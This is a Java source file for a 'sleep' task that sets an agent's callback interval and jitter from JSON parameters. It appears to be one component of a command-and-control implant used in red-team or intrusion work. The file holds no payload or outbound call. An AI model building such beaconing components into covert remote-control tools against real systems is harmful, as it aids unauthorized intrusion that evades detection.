package com.woopsie.tasks;

import com.fasterxml.jackson.databind.JsonNode;
import com.woopsie.Config;

/**
 * Sleep task - updates the agent's sleep interval and jitter
 */
public class SleepTask implements Task {
    
    @Override
    public String execute(Config config, JsonNode parameters) throws Exception {
        // Extract interval and jitter parameters
        if (!parameters.has("interval")) {
            throw new Exception("interval parameter is required");
        }
        
        int interval = parameters.get("interval").asInt();
        int jitter = parameters.has("jitter") ? parameters.get("jitter").asInt() : 0;
        
        Config.debugLog(config, "Sleep command - interval: " + interval + ", jitter: " + jitter);
        
        // Update the config values
        config.setSleepInterval(interval * 1000); // Convert seconds to milliseconds
        config.setJitter(jitter);
        
        // Return success message
        return String.format("Set new sleep interval to %d second(s) with a jitter of %d%%", interval, jitter);
    }
    
    @Override
    public String getCommandName() {
        return "sleep";
    }
}
